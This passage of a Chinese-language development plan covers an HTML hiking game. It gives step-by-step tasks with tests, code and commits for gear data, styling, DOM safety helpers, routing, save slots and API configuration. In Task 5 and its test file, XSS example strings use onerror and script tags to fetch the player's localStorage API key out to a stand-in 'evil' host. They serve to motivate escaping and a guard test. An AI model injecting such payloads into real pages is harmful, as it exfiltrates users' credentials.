  const 普通 = getGear('sleeping_bag')
  const 极寒 = getGear('winter_bag')
  assert.ok(极寒.温标 < 普通.温标, '极寒睡袋应该更保暖')
  assert.ok(极寒.档次[0].价格 > 普通.档次[1].价格, '更保暖的应该更贵')
  assert.ok(极寒.档次[0].重量 > 普通.档次[1].重量, '更保暖的应该更重')
})
```

`test/consume.test.js` 追加：

```js
test('有极寒睡袋时取最暖的那件算有效温标', () => {
  const s = 状态({ 海拔: 3100 })
  s.pack.push({ gearId: 'sleeping_bag', 档: '主流', 数量: 1, 单重: 1.2, 余量: 100 })
  assert.equal(effectiveWarmth(s), -10)
  s.pack.push({ gearId: 'winter_bag', 档: '通用', 数量: 1, 单重: 1.8, 余量: 100 })
  assert.equal(effectiveWarmth(s), -25, '带了极寒睡袋却还按普通睡袋算')
})

test('冬季带极寒睡袋不再失温', () => {
  const s = 状态({ 海拔: 3100 })
  s.meta.季节 = '冬季'
  s.place.nodeId = 'shuiwozi'
  s.pack.push({ gearId: 'winter_bag', 档: '通用', 数量: 1, 单重: 1.8, 余量: 100 })
  sleep(s, { 恶劣天气: false })
  assert.equal(s.flags.失温连败, 0)
})
```

`test/seasons.test.js` 追加：

```js
test('冬季带极寒睡袋不再报温标警告', () => {
  const w = gearWarnings('冬季', ['winter_bag'])
  assert.ok(!w.some((x) => x.includes('温标')), `仍报警：${w.join('｜')}`)
})
```

- [ ] **Step 2: 跑测试确认失败**

Run: `npm test -- test/gear.test.js test/consume.test.js test/seasons.test.js`
Expected: FAIL — `winter_bag` 不存在、数量与合计对不上

- [ ] **Step 3: 加装备**

`src/data/gear.js` 的 `EXTRA_GEAR` 里，紧挨 `bag_liner` 之前插入：

```js
  { id: 'winter_bag', 名称: '极寒睡袋（舒适温标-25℃）', 类别: '扩充·保暖', 温标: -25,
    作用: '冬季唯一扛得住的睡袋；文档四季表给冬季推荐「极寒睡袋（-20℃以下）」，原表却只有 -10℃ 那款',
    档次: [{ 档: '通用', 价格: 2400, 重量: 1.8 }] },
```

- [ ] **Step 4: 改「取最暖睡袋」的两处**

`src/engine/consume.js` 的 `effectiveWarmth` 替换为：

```js
// 有效温标 = 最保暖那件睡袋的温标 − 内胆加成。数字越低越保暖。
// 没带睡袋记 +99：不是「有点冷」，是根本没有保暖可言。
// 遍历所有睡袋而不是写死 sleeping_bag——装备表里不止一款，写死会让
// 花大价钱买的极寒睡袋毫无作用，且没有任何测试会发现。
const 睡袋清单 = ['sleeping_bag', 'winter_bag']

export function effectiveWarmth(state) {
  const 温标表 = 睡袋清单
    .filter((id) => hasItem(state, id))
    .map((id) => getGear(id)?.温标)
    .filter((v) => typeof v === 'number')
  if (!温标表.length) return 毫无保暖
  const 最暖 = Math.min(...温标表)
  const 加成 = hasItem(state, 'bag_liner') ? (getGear('bag_liner')?.温标加成 ?? 0) : 0
  return 最暖 - 加成
}
```

`src/data/seasons.js` 的 `gearWarnings` 里，睡袋那一段替换为：

```js
  // 温标一律从 gear.js 读，且遍历所有睡袋取最暖的那件——写死单一 id 会让
  // 玩家买了极寒睡袋仍看到警告，那这笔钱就白花了。
  const 睡袋们 = ['sleeping_bag', 'winter_bag'].filter((id) => owned.has(id))
  if (!睡袋们.length) {
    if (season.夜间温度 < 0) {
      警告.push(`${season.名称}夜间约 ${season.夜间温度}℃，没带睡袋，夜里根本扛不住。`)
    }
  } else {
    const 最暖 = Math.min(...睡袋们.map((id) => getGear(id).温标))
    const 加成 = owned.has('bag_liner') ? (getGear('bag_liner')?.温标加成 ?? 0) : 0
    const 实际温标 = 最暖 - 加成
    if (season.夜间温度 < 实际温标) {
      警告.push(`${season.名称}夜间约 ${season.夜间温度}℃，睡袋温标 ${实际温标}℃ 不够用，夜里会冷醒甚至失温。`)
    }
  }
```

- [ ] **Step 5: 跑测试确认通过**

Run: `npm test`
Expected: 全绿。**既有的「睡袋温标从 gear.js 读取」那条（-10℃ / 加内胆 -15℃）必须继续通过**——它验的是不写死数值，与本任务方向一致。

- [ ] **Step 6: 订正 spec 第 7 节**

`docs/superpowers/specs/2026-08-11-aotai-html-game-design.md`：

- 扩充物资表追加一行：`| 极寒睡袋（−25℃） | 1.8kg | ¥2,400 | 冬季唯一扛得住的睡袋 |`
- 「**合计 16.05kg / ¥7,630。**」→「**合计 17.85kg / ¥10,030。**」
- 「相加 **30.15kg / ¥22,005**」→「相加 **31.95kg / ¥24,405**」
- 「只买得起约 45%」→「只买得起约 41%」

- [ ] **Step 7: 提交**

```bash
git add src/data/gear.js src/engine/consume.js src/data/seasons.js docs/superpowers/specs/2026-08-11-aotai-html-game-design.md test/
git commit -m "feat: 补一款极寒睡袋，让冬季警告能被消除

计划一记下的待调项。装备表最暖的睡袋 -10℃，加内胆 -15℃，
而冬季夜间 -25℃——玩家无论怎么买都消不掉那条警告，而商店
界面会把它明晃晃摆在警告栏里。一条点了「一键推荐」也消不掉
的警告，正是训练玩家无视所有警告的元凶。

根子在源文档自身：装备表只有 -10℃ 那款，四季表却给冬季推荐
「极寒睡袋（-20℃以下）」，两张表本就对不上。

顺带把 effectiveWarmth 与 gearWarnings 里写死的 sleeping_bag
改为遍历所有睡袋取最暖的——否则花 ¥2400 买的极寒睡袋毫无作用，
且没有任何测试会发现。

两条核心约束不受影响：全配 31.95kg / ¥24,405，仍双双超限。

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

---

## 阶段二 · UI 基础设施

### Task 4: 构建管线注入样式

`buildHtml()` 目前把 `__STYLES__` 替换成空字符串——样式从来没接进来过。本任务让它读 `src/styles.css`。

**Files:**
- Create: `src/styles.css`
- Modify: `build.mjs`
- Test: `test/build.test.js`（追加）

- [ ] **Step 1: 追加失败的测试**

在 `test/build.test.js` 末尾追加：

```js
test('buildHtml 把 styles.css 注进去，不再是空字符串', () => {
  const html = buildHtml()
  assert.ok(!html.includes('__STYLES__'), '占位符没被替换')
  assert.ok(html.includes('--bg-deep'), '主题变量没进产物')
  assert.ok(/<style>[\s\S]{200,}<\/style>/.test(html), '样式内容过短，可能没读到文件')
})

test('样式里不得出现会破坏 HTML 的闭合标签', () => {
  const css = readFileSync(join(ROOT_DIR, 'src/styles.css'), 'utf8')
  assert.ok(!css.includes('</style'), 'CSS 里出现 </style 会提前闭合样式块')
})
```

该文件顶部补上（若尚未导入）：

```js
import { buildHtml } from '../build.mjs'
import { readFileSync } from 'node:fs'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'
const ROOT_DIR = join(dirname(fileURLToPath(import.meta.url)), '..')
```

- [ ] **Step 2: 跑测试确认失败**

Run: `npm test -- test/build.test.js`
Expected: FAIL — 找不到 `src/styles.css`，或占位符仍在

- [ ] **Step 3: 写样式**

`src/styles.css`（主题取自头脑风暴阶段确认的高山冷色调）：

```css
:root {
  --bg-deep: #0b0f13;
  --bg-panel: #0f1418;
  --bg-raise: #151c22;
  --line: #263038;
  --line-soft: #1c262d;
  --text: #c8d2d8;
  --text-dim: #8fa3b0;
  --text-faint: #5f7482;
  --accent: #5b8fa8;
  --accent-bright: #7fb3d0;
  --warn: #b8863f;
  --danger: #c9724a;
  --ok: #6f9a7a;
  --radius: 6px;
}

* { box-sizing: border-box; }

body {
  margin: 0;
  background: var(--bg-deep);
  color: var(--text);
  font: 14px/1.7 -apple-system, "PingFang SC", "Microsoft YaHei", sans-serif;
}

#app { max-width: 1080px; margin: 0 auto; padding: 24px 20px 60px; }

h1, h2, h3 { font-weight: 600; margin: 0 0 12px; }
h1 { font-size: 22px; }
h2 { font-size: 17px; }
h3 { font-size: 14px; color: var(--text-dim); }

.screen { display: none; }
.screen.active { display: block; }

.panel {
  background: var(--bg-panel);
  border: 1px solid var(--line);
  border-radius: var(--radius);
  padding: 16px;
  margin-bottom: 14px;
}

.row { display: flex; gap: 12px; align-items: center; }
.row-between { display: flex; justify-content: space-between; align-items: center; }
.grow { flex: 1; min-width: 0; }
.muted { color: var(--text-faint); font-size: 12px; }
.dim { color: var(--text-dim); }

label { display: block; font-size: 12px; color: var(--text-faint); margin-bottom: 4px; }

input[type=text], input[type=number], input[type=password], select, textarea {
  width: 100%;
  background: var(--bg-deep);
  border: 1px solid var(--line);
  border-radius: 4px;
  color: var(--text);
  padding: 7px 9px;
  font: inherit;
  font-size: 13px;
}
input:focus, select:focus, textarea:focus { outline: none; border-color: var(--accent); }

button {
  background: var(--bg-raise);
  border: 1px solid var(--line);
  border-radius: 4px;
  color: var(--text);
  padding: 8px 14px;
  font: inherit;
  font-size: 13px;
  cursor: pointer;
}
button:hover:not(:disabled) { border-color: var(--accent); }
button:disabled { opacity: .45; cursor: not-allowed; }
button.primary { background: #24404f; border-color: #3f6478; color: #c8e2f0; }

.meter { height: 6px; background: var(--line-soft); border-radius: 3px; overflow: hidden; }
.meter > i { display: block; height: 100%; background: var(--accent); }
.meter.warn > i { background: var(--warn); }
.meter.danger > i { background: var(--danger); }

.avatar {
  border-radius: 50%;
  flex: none;
  border: 1px solid #465966;
  background: linear-gradient(150deg, #3a4b57, #222c34);
}

.tag {
  display: inline-block;
  font-size: 10px;
  border: 1px solid var(--line);
  border-radius: 3px;
  padding: 1px 6px;
  color: var(--text-dim);
  margin-right: 3px;
  cursor: pointer;
  user-select: none;
}
.tag.on { background: #24404f; border-color: #3f6478; color: #c8e2f0; }

.item-row {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 6px 9px;
  border-radius: 4px;
  border: 1px solid transparent;
  font-size: 12px;
}
.item-row.on { background: #16232b; border-color: #2f4a58; }
.item-row.blocked { opacity: .5; }

.notice {
  border-radius: var(--radius);
  padding: 9px 11px;
  font-size: 12px;
  line-height: 1.7;
  margin-bottom: 8px;
}
.notice.warn { background: rgba(160,90,60,.1); border: 1px solid #4a2e26; color: #c9a58f; }
.notice.info { background: rgba(70,120,150,.08); border: 1px solid #2c4a5c; color: #9fc4d8; }

.cat-head {
  font-size: 10px;
  letter-spacing: .1em;
  color: var(--text-faint);
  margin: 12px 0 5px;
  padding-bottom: 3px;
  border-bottom: 1px solid var(--line-soft);
}
```

- [ ] **Step 4: 改 buildHtml**

`build.mjs` 的 `buildHtml` 替换为：

```js
export function buildHtml() {
  const shell = readFileSync(join(ROOT, 'src/index.html'), 'utf8')
  assertHtmlPlaceholders(shell)
  const styles = readFileSync(join(ROOT, 'src/styles.css'), 'utf8')
  if (styles.includes('</style')) {
    throw new Error('src/styles.css 含 </style，会提前闭合样式块')
  }
  return shell.replace('__STYLES__', styles).replace('__SCRIPT__', buildScript())
}
```

- [ ] **Step 5: 跑测试并构建**

Run: `npm test -- test/build.test.js` → PASS
Run: `npm run build` → 成功，产物体积应明显变大

- [ ] **Step 6: 提交**

```bash
git add src/styles.css build.mjs test/build.test.js
git commit -m "feat: 构建管线注入样式，主题变量落地

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

---

### Task 5: DOM 工具与渲染安全基线

本任务确立全项目的渲染安全底线，往后每个界面都建在它上面。

**为什么这是安全问题而不是风格问题：** 上屏的动态内容里有 LLM 写的正文，而产物是单文件 HTML、玩家的 API key 就存在同源 `localStorage`。一段 `<img src=x onerror="fetch('//evil/'+localStorage.aotai_config)">` 混进正文并被 `innerHTML` 渲染，key 就出去了。模型不需要有恶意，复读了脏数据就够。

**Files:**
- Create: `src/ui/dom.js`
- Modify: `build.mjs`
- Test: `test/dom.test.js`

- [ ] **Step 1: 写失败的测试**

`test/dom.test.js`：

```js
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { readFileSync, readdirSync } from 'node:fs'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { esc } from '../src/ui/dom.js'

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..')

test('esc 转掉全部五个危险字符', () => {
  assert.equal(esc('<img src=x onerror=alert(1)>'), '&lt;img src=x onerror=alert(1)&gt;')
  assert.equal(esc('a & b'), 'a &amp; b')
  assert.equal(esc(`"双引号"和'单引号'`), '&quot;双引号&quot;和&#39;单引号&#39;')
})

test('esc 对非字符串输入不炸', () => {
  assert.equal(esc(null), '')
  assert.equal(esc(undefined), '')
  assert.equal(esc(42), '42')
})

test('esc 后的串再也构不成标签', () => {
  const 恶意 = '<script>fetch("//evil/"+localStorage.aotai_config)</script>'
  const 安全 = esc(恶意)
  assert.ok(!安全.includes('<script'), '仍含可执行标签起始')
  assert.ok(!安全.includes('</script'), '仍含标签闭合')
})

// —— 这条是整个 UI 层的安全护栏 ——
test('src/ui 下没有任何模块把变量拼进 innerHTML', () => {
  const 违规 = []
  for (const f of readdirSync(join(ROOT, 'src/ui'))) {
    if (!f.endsWith('.js')) continue
    const 源码 = readFileSync(join(ROOT, 'src/ui', f), 'utf8')
    源码.split('\n').forEach((line, i) => {
      // 允许静态骨架：innerHTML = '...' 或 `...`（其中不含 ${}）
      if (!/innerHTML\s*(\+)?=/.test(line)) return
      // 立绘 SVG 是本地生成的静态字符串、不含任何外部输入，且 portrait.test.js
      // 已断言其中没有 <script 与 on*= ——这是唯一的例外，必须显式标注才放行
      if (line.includes('portrait-svg-safe')) return
      const 有插值 = /\$\{/.test(line)
      const 拼变量 = /innerHTML\s*(\+)?=\s*[^'"`]/.test(line)
      if (有插值 || 拼变量) 违规.push(`${f}:${i + 1}  ${line.trim()}`)
    })
  }
  assert.deepEqual(违规, [],
    `禁止把动态数据拼进 innerHTML（LLM 正文会上屏，key 就在同源 localStorage）：\n  ${违规.join('\n  ')}`)
})
```

- [ ] **Step 2: 跑测试确认失败**

Run: `npm test -- test/dom.test.js`
Expected: FAIL — 模块不存在

- [ ] **Step 3: 写实现**

`src/ui/dom.js`：

```js
// DOM 工具。全项目的渲染安全基线都在这里。
//
// 铁律：动态数据只能经 setText 落地（内部用 textContent），
// 绝不允许拼进 innerHTML。上屏内容里有 LLM 写的正文，而玩家的
// API key 就在同源 localStorage 里——一段被注入的 onerror 就能把它送走。
// 模型不需要有恶意，复读了脏数据就够。test/dom.test.js 有一条护栏扫描全目录。

const HTML_ESCAPES = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }

export function esc(v) {
  if (v === null || v === undefined) return ''
  return String(v).replace(/[&<>"']/g, (c) => HTML_ESCAPES[c])
}

// href/src 这类属性走的是 setAttribute，innerHTML 护栏完全扫不到。
// LLM 写的字符串一旦流进来，玩家点一下链接就执行了——和注入 onerror 是一回事。
const DOM_URL_ATTRS = new Set(['href', 'src', 'action', 'formaction', 'xlink:href'])
const DOM_UNSAFE_URL = /^\s*javascript:/i

export function el(tag, attrs = {}, children = []) {
  const node = document.createElement(tag)
  for (const [k, v] of Object.entries(attrs)) {
    if (v === null || v === undefined || v === false) continue
    if (k === 'class') node.className = v
    else if (k === 'text') node.textContent = String(v)
    else if (k.startsWith('on')) {
      // 只收函数。传字符串的话会掉进下面的 setAttribute，变成 onclick="..." 内联
      // 处理器——正是本模块存在的理由要杜绝的东西。宁可大声报错也不能悄悄放行。
      if (typeof v !== 'function') throw new Error(`el(): ${k} 只能接函数，收到 ${typeof v}`)
      node.addEventListener(k.slice(2), v)
    } else {
      if (DOM_URL_ATTRS.has(k) && DOM_UNSAFE_URL.test(String(v))) {
        throw new Error(`el(): ${k} 不接受 javascript: URL`)
      }
      node.setAttribute(k, String(v))
    }
  }
  for (const c of [].concat(children)) {
    if (c === null || c === undefined || c === false) continue
    node.appendChild(typeof c === 'string' ? document.createTextNode(c) : c)
  }
  return node
}

export function setText(node, v) {
  node.textContent = v === null || v === undefined ? '' : String(v)
  return node
}

export function clear(node) {
  while (node.firstChild) node.removeChild(node.firstChild)
  return node
}

export function on(root, selector, event, handler) {
  root.addEventListener(event, (e) => {
    const hit = e.target.closest(selector)
    if (hit && root.contains(hit)) handler(e, hit)
  })
}

export function $(sel, root = document) {
  return root.querySelector(sel)
}
```

- [ ] **Step 4: 跑测试确认通过**

Run: `npm test -- test/dom.test.js`
Expected: PASS，4 个测试全绿

- [ ] **Step 5: 验证护栏真的会拦人**

Run:

```bash
cat > /tmp/bad.js <<'EOF'
export function renderBad(root, name) {
  root.innerHTML = `<div>${name}</div>`
}
EOF
cp /tmp/bad.js src/ui/_tmp_bad.js
npm test -- test/dom.test.js 2>&1 | grep -E "禁止把动态数据|_tmp_bad" | head -3
rm src/ui/_tmp_bad.js
```

Expected：护栏报出 `_tmp_bad.js:2`。若没报，说明正则太松，修到能拦住为止。

- [ ] **Step 6: 登记进构建顺序并提交**

`build.mjs` 的 `MODULE_ORDER` 末尾追加 `'src/ui/dom.js',`。

Run: `npm test` → 全绿

```bash
git add src/ui/dom.js test/dom.test.js build.mjs
git commit -m "feat: DOM 工具与渲染安全基线

动态内容一律走 textContent。加一条扫描 src/ui 全目录的护栏测试，
禁止把变量拼进 innerHTML——LLM 正文会上屏，而 API key 就在
同源 localStorage 里，一段注入的 onerror 就能把它送走。

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

---

### Task 6: 屏幕路由与应用骨架

**Files:**
- Create: `src/ui/router.js`
- Modify: `src/index.html`, `build.mjs`
- Test: `test/router.test.js`

- [ ] **Step 1: 写失败的测试**

`test/router.test.js`：

```js
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { createRouter } from '../src/ui/router.js'

// 极简 DOM 替身：只实现 router 用到的那点接口
function 假元素(id) {
  return { id, className: '', _shown: false,
    classList: {
      add(c) { if (c === 'active') this._n._shown = true },
      remove(c) { if (c === 'active') this._n._shown = false },
    } }
}
function 造() {
  const nodes = {}
  for (const id of ['a', 'b', 'c']) {
    const n = 假元素(id)
    n.classList._n = n
    nodes[id] = n
  }
  return { nodes, find: (id) => nodes[id] }
}

test('切换只让目标屏幕可见', () => {
  const { nodes, find } = 造()
  const r = createRouter(find)
  r.register('a'); r.register('b')
  r.go('a')
  assert.equal(nodes.a._shown, true)
  assert.equal(nodes.b._shown, false)
  r.go('b')
  assert.equal(nodes.a._shown, false)
  assert.equal(nodes.b._shown, true)
})

test('current 反映当前屏幕', () => {
  const { find } = 造()
  const r = createRouter(find)
  r.register('a'); r.register('b')
  assert.equal(r.current(), null)
  r.go('b')
  assert.equal(r.current(), 'b')
})

test('进入屏幕会触发 onEnter，并拿到参数', () => {
  const { find } = 造()
  const r = createRouter(find)
  let 收到 = null
  r.register('a', { onEnter: (arg) => { 收到 = arg } })
  r.go('a', { from: 'test' })
  assert.deepEqual(收到, { from: 'test' })
})

test('切走会触发 onLeave', () => {
  const { find } = 造()
  const r = createRouter(find)
  let 离开了 = false
  r.register('a', { onLeave: () => { 离开了 = true } })
  r.register('b')
  r.go('a'); r.go('b')
  assert.equal(离开了, true)
})

test('去未注册的屏幕会抛出可读的错，而不是静默什么都不做', () => {
  const { find } = 造()
  const r = createRouter(find)
  assert.throws(() => r.go('查无此屏'), /未注册/)
})
```

- [ ] **Step 2: 跑测试确认失败**

Run: `npm test -- test/router.test.js`
Expected: FAIL — 模块不存在

- [ ] **Step 3: 写实现**

`src/ui/router.js`：

```js
// 极简屏幕路由。find 是取节点的函数，注入进来是为了能在没有 DOM 的测试里跑。
export function createRouter(find) {
  const 屏幕 = new Map()
  let 当前 = null

  return {
    register(id, hooks = {}) {
      屏幕.set(id, hooks)
    },
    current() {
      return 当前
    },
    go(id, arg) {
      if (!屏幕.has(id)) throw new Error(`屏幕未注册：${id}`)
      if (当前 !== null) {
        const 旧 = find(当前)
        if (旧) 旧.classList.remove('active')
        const h = 屏幕.get(当前)
        if (h && h.onLeave) h.onLeave()
      }
      当前 = id
      const 新 = find(id)
      if (新) 新.classList.add('active')
      const h = 屏幕.get(id)
      if (h && h.onEnter) h.onEnter(arg)
    },
  }
}
```

- [ ] **Step 4: 跑测试确认通过**

Run: `npm test -- test/router.test.js`
Expected: PASS，5 个测试全绿

- [ ] **Step 5: 补 index.html 的屏幕容器**

`src/index.html` 的 `<body>` 替换为：

```html
<body>
<div id="app">
  <section id="screen-config" class="screen"></section>
  <section id="screen-create" class="screen"></section>
  <section id="screen-draw" class="screen"></section>
  <section id="screen-shop" class="screen"></section>
</div>
<script>__SCRIPT__</script>
</body>
```

- [ ] **Step 6: 登记并提交**

`build.mjs` 的 `MODULE_ORDER` 末尾追加 `'src/ui/router.js',`。

Run: `npm test` → 全绿；`npm run build` → 成功

```bash
git add src/ui/router.js src/index.html test/router.test.js build.mjs
git commit -m "feat: 屏幕路由与应用骨架

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

---

### Task 7: 存档

3 个手动槽 + 1 个自动槽，导出/导入 JSON，带版本迁移。

**Files:**
- Create: `src/ui/save.js`
- Modify: `build.mjs`
- Test: `test/save.test.js`

- [ ] **Step 1: 写失败的测试**

`test/save.test.js`：

```js
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { SAVE_SLOTS, saveKey, packSave, unpackSave, migrateSave, listSaves, writeSave, readSave, deleteSave } from '../src/ui/save.js'
import { createInitialState, STATE_VERSION } from '../src/engine/state.js'
import { createJournal } from '../src/engine/journal.js'

function 假存储() {
  const m = new Map()
  return {
    getItem: (k) => (m.has(k) ? m.get(k) : null),
    setItem: (k, v) => m.set(k, String(v)),
    removeItem: (k) => m.delete(k),
    key: (i) => [...m.keys()][i] ?? null,
    get length() { return m.size },
  }
}

function 局面() {
  const s = createInitialState({
    种子: 7, 季节: '秋季',
    pc: { 名字: '周野', 职业: '工程师', 年龄: 28, 性别: '男', 性格: 'renside',
          外貌: '偏瘦', 技能: [], 户外经验: 38 },
    队友: [{ npcId: 'chenyan', 好感: 45 }], 背包: [], 金钱: 4320,
  })
  return { state: s, journal: createJournal() }
}

test('槽位有 3 个手动加 1 个自动', () => {
  assert.equal(SAVE_SLOTS.filter((s) => s.自动).length, 1)
  assert.equal(SAVE_SLOTS.filter((s) => !s.自动).length, 3)
})

test('打包再解包，状态与档案原样回来', () => {
  const { state, journal } = 局面()
  const 回来 = unpackSave(packSave(state, journal))
  assert.equal(回来.state.pc.名字, '周野')
  assert.equal(回来.state.money, 4320)
  assert.deepEqual(回来.journal.关键事件, [])
})

test('存档带版本号与摘要，槽位列表不用解全量就能显示', () => {
  const { state, journal } = 局面()
  const 包 = JSON.parse(packSave(state, journal))
  assert.equal(包.版本, STATE_VERSION)
  assert.ok(包.摘要.includes('周野'))
  assert.ok(包.摘要.includes('秋季'))
})

test('写入再读出', () => {
  const st = 假存储()
  const { state, journal } = 局面()
  writeSave(st, 'slot1', state, journal)
  const 读 = readSave(st, 'slot1')
  assert.equal(读.state.pc.名字, '周野')
})

test('读空槽返回 null，不抛', () => {
  assert.equal(readSave(假存储(), 'slot1'), null)
})

test('读到坏 JSON 返回 null 而不是炸掉整个应用', () => {
  const st = 假存储()
  st.setItem(saveKey('slot1'), '{这不是 JSON')
  assert.equal(readSave(st, 'slot1'), null)
})

test('删除槽位', () => {
  const st = 假存储()
  const { state, journal } = 局面()
  writeSave(st, 'slot2', state, journal)
  deleteSave(st, 'slot2')
  assert.equal(readSave(st, 'slot2'), null)
})

test('listSaves 给出每槽的占用情况与摘要', () => {
  const st = 假存储()
  const { state, journal } = 局面()
  writeSave(st, 'slot1', state, journal)
  const 列表 = listSaves(st)
  assert.equal(列表.length, 4)
  const s1 = 列表.find((x) => x.id === 'slot1')
  assert.equal(s1.占用, true)
  assert.ok(s1.摘要.includes('周野'))
  assert.equal(列表.find((x) => x.id === 'slot2').占用, false)
})

test('迁移：低版本存档被识别并标记', () => {
  const 旧 = { 版本: 0, state: { meta: {} }, journal: {}, 摘要: '旧档' }
  const r = migrateSave(旧)
  assert.equal(r.迁移过, true)
  assert.equal(r.包.版本, STATE_VERSION)
})

test('迁移：高于当前版本的存档拒绝加载，而不是硬吃', () => {
  const 未来 = { 版本: STATE_VERSION + 5, state: {}, journal: {}, 摘要: '未来档' }
  const r = migrateSave(未来)
  assert.equal(r.可用, false)
  assert.ok(r.原因.includes('版本'))
})
```

- [ ] **Step 2: 跑测试确认失败**

Run: `npm test -- test/save.test.js`
Expected: FAIL — 模块不存在

- [ ] **Step 3: 写实现**

`src/ui/save.js`：

```js
import { STATE_VERSION } from '../engine/state.js'

const SAVE_PREFIX = 'aotai_save_'

export const SAVE_SLOTS = [
  { id: 'auto', 名称: '自动存档', 自动: true },
  { id: 'slot1', 名称: '存档 1', 自动: false },
  { id: 'slot2', 名称: '存档 2', 自动: false },
  { id: 'slot3', 名称: '存档 3', 自动: false },
]

export function saveKey(slotId) {
  return SAVE_PREFIX + slotId
}

// 摘要单独存一份，槽位列表就不必解开全量状态——存档大了以后这一点会明显。
function 造摘要(state) {
  return `${state.pc.名字}｜${state.meta.季节}｜第${state.clock.day}天${state.clock.slot}｜${state.place.nodeId}`
}

export function packSave(state, journal) {
  return JSON.stringify({
    版本: STATE_VERSION,
    摘要: 造摘要(state),
    state,
    journal,
  })
}

export function unpackSave(文本) {
  const 包 = JSON.parse(文本)
  return { state: 包.state, journal: 包.journal, 摘要: 包.摘要, 版本: 包.版本 }
}

// 版本迁移。比当前版本低的按需补字段；比当前版本高的一律拒绝——
// 硬吃一个未来格式的存档，坏法会非常隐蔽。
export function migrateSave(包) {
  if (typeof 包?.版本 !== 'number') {
    return { 可用: false, 原因: '存档缺版本号，无法判断格式' }
  }
  if (包.版本 > STATE_VERSION) {
    return { 可用: false, 原因: `存档版本 ${包.版本} 高于当前 ${STATE_VERSION}，可能来自更新的版本` }
  }
  if (包.版本 === STATE_VERSION) {
    return { 可用: true, 迁移过: false, 包 }
  }
  const 新 = { ...包, 版本: STATE_VERSION }
  return { 可用: true, 迁移过: true, 包: 新 }
}

export function writeSave(storage, slotId, state, journal) {
  try {
    storage.setItem(saveKey(slotId), packSave(state, journal))
    return true
  } catch (err) {
    // 配额满时 setItem 抛 QuotaExceededError。无条件返回 true 是撒谎——
    // 调用方以为存上了，玩家的一整趟就这么没了。返回 false 让 UI 能报出来。
    return false
  }
}

export function readSave(storage, slotId) {
  const 原文 = storage.getItem(saveKey(slotId))
  if (!原文) return null
  try {
    const 包 = JSON.parse(原文)
    const r = migrateSave(包)
    if (!r.可用) return null
    return unpackSave(JSON.stringify(r.包))
  } catch {
    // 坏档不该拖垮整个应用，当空槽处理
    return null
  }
}

export function deleteSave(storage, slotId) {
  storage.removeItem(saveKey(slotId))
}

export function listSaves(storage) {
  return SAVE_SLOTS.map((槽) => {
    const 原文 = storage.getItem(saveKey(槽.id))
    if (!原文) return { ...槽, 占用: false, 摘要: '' }
    try {
      const 包 = JSON.parse(原文)
      return { ...槽, 占用: true, 摘要: String(包.摘要 || ''), 版本: 包.版本 }
    } catch {
      return { ...槽, 占用: true, 摘要: '（存档已损坏）', 损坏: true }
    }
  })
}
```

- [ ] **Step 4: 跑测试确认通过**

Run: `npm test -- test/save.test.js`
Expected: PASS，10 个测试全绿

- [ ] **Step 5: 登记并提交**

`build.mjs` 的 `MODULE_ORDER` 末尾追加 `'src/ui/save.js',`。

```bash
git add src/ui/save.js test/save.test.js build.mjs
git commit -m "feat: 存档槽位、版本迁移与坏档兜底

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

---

### Task 8: API 配置

**Files:**
- Create: `src/ui/config.js`
- Modify: `build.mjs`
- Test: `test/config.test.js`

- [ ] **Step 1: 写失败的测试**

`test/config.test.js`：

```js
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { configViewModel, normalizeConfig, validateConfig, CONFIG_KEY, loadConfig, saveConfig } from '../src/ui/config.js'
import { PRESETS } from '../src/llm/client.js'

function 假存储() {
  const m = new Map()
  return {
    getItem: (k) => (m.has(k) ? m.get(k) : null),
    setItem: (k, v) => m.set(k, String(v)),
    removeItem: (k) => m.delete(k),
  }
}

test('视图模型列出全部预设，并标出当前选中', () => {
  const vm = configViewModel({ presetId: 'siliconflow' })
  assert.equal(vm.预设.length, PRESETS.length)
  assert.equal(vm.预设.find((p) => p.选中).id, 'siliconflow')
})

test('选了预设就带出默认 baseURL 与模型', () => {
  const c = normalizeConfig({ presetId: 'deepseek' })
  const 预设 = PRESETS.find((p) => p.id === 'deepseek')
  assert.equal(c.baseURL, 预设.baseURL)
  assert.equal(c.model, 预设.默认模型)
})

test('自定义值不会被预设覆盖掉', () => {
  const c = normalizeConfig({ presetId: 'deepseek', model: 'deepseek-reasoner' })
  assert.equal(c.model, 'deepseek-reasoner')
})

test('校验：没填 key 不放行', () => {
  const r = validateConfig({ presetId: 'deepseek', apiKey: '' })
  assert.equal(r.ok, false)
  assert.ok(r.问题.some((x) => x.includes('key')))
})

test('校验：baseURL 必须是 http(s)', () => {
  const r = validateConfig({ presetId: 'custom', apiKey: 'k', baseURL: 'ftp://x', model: 'm' })
  assert.equal(r.ok, false)
  assert.ok(r.问题.some((x) => x.includes('baseURL')))
})

test('校验：填齐了就放行', () => {
  assert.equal(validateConfig({ presetId: 'deepseek', apiKey: 'sk-x' }).ok, true)
})

test('存取走 localStorage，key 明确只留在本地', () => {
  const st = 假存储()
  saveConfig(st, { presetId: 'deepseek', apiKey: 'sk-secret', model: 'm' })
  assert.equal(loadConfig(st).apiKey, 'sk-secret')
  assert.ok(CONFIG_KEY.startsWith('aotai_'))
})

test('读不到配置时给一份可用的默认值，而不是 null', () => {
  const c = loadConfig(假存储())
  assert.equal(typeof c.presetId, 'string')
  assert.equal(c.apiKey, '')
})

test('坏掉的配置不拖垮应用', () => {
  const st = 假存储()
  st.setItem(CONFIG_KEY, '{坏的')
  assert.equal(loadConfig(st).apiKey, '')
})

test('脱敏只露头尾，中间一律遮住', () => {
  const vm = configViewModel({ presetId: 'deepseek', apiKey: 'sk-abcdefghijklmnop' })
  assert.ok(!vm.key脱敏.includes('defghijklm'), `脱敏没遮住：${vm.key脱敏}`)
  assert.ok(vm.key脱敏.startsWith('sk-'))
})
```

